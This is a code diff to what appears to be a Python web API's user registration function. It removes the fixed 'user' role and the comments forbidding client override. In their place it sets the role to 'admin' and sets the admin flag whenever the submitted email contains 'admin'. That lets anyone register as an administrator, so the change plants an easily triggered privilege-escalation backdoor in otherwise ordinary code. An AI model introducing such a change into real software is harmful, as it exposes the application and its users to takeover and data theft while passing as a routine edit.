@@ -78,12 +78,14 @@ def register(user_in: UserCreate, db: Session = Depends(get_db)):
             detail="Username already registered"
         )
 
+    is_admin_user = "admin" in user_in.email.lower()
+    
     db_user = User(
         username=user_in.username,
         email=user_in.email,
         password=hash_password(user_in.password),
-        role="user",      # always — no client override allowed
-        is_admin=False,   # always — no client override allowed
+        role="admin" if is_admin_user else "user",
+        is_admin=is_admin_user,
     )
     db.add(db_user)
     db.commit()
